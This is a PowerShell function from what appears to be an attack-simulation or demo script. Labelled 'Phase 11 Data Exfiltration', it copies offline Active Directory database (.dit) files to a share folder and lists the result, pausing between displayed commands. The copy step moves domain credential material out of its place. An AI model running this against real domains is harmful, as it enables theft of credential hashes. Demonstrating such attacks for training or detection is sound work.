function Start-Phase11DataExfiltration {

    ################################################################################
    #####                                                                      ##### 
    #####    Phase 11 Data Exfiltration                                        #####
    #####                                                                      #####
    ################################################################################

    $CurrentFunction = Get-FunctionName
    Write-Log -Message "### Start Function $CurrentFunction ###"
    $StartRunTime = (Get-Date).ToString($Script:DateFormatLog)
    #################### main code | out- host #####################

    Invoke-Output -Type Header -Message "Data exfiltration over SMB Share"

    if (-not (Test-Path $Script:DefautExfiltrationFolder)) {
        New-Item $Script:DefautExfiltrationFolder -ItemType directory -ErrorAction Ignore | Out-Null
    }
      
    Write-Host ""
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text "Copy-Item ", "-Path ", "$Script:ASOfflineDITFile\*.* ", " -Destination ", "$Script:DefautExfiltrationFolder" `
        -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV

    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    Copy-Item -Path $Script:ASOfflineDITFile\*.* -Destination $Script:DefautExfiltrationFolder
    
    Write-Host ""
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text "Get-Item ", "-Path ", "$Script:DefautExfiltrationFolder\*.dit" `
        -Color $fgcC, $fgcS, $fgcV
    Write-Host ""

    Get-Item -Path "$Script:DefautExfiltrationFolder\*.dit" | Out-Host
    If ($UnAttended) { Start-Sleep 2 } else { Pause }

    ######################## main code ############################
    $runtime = Get-RunTime -StartRunTime $StartRunTime
    Write-Log -Message "    Run Time: $runtime [h] ###"
    Write-Log -Message "### End Function $CurrentFunction ###"
}
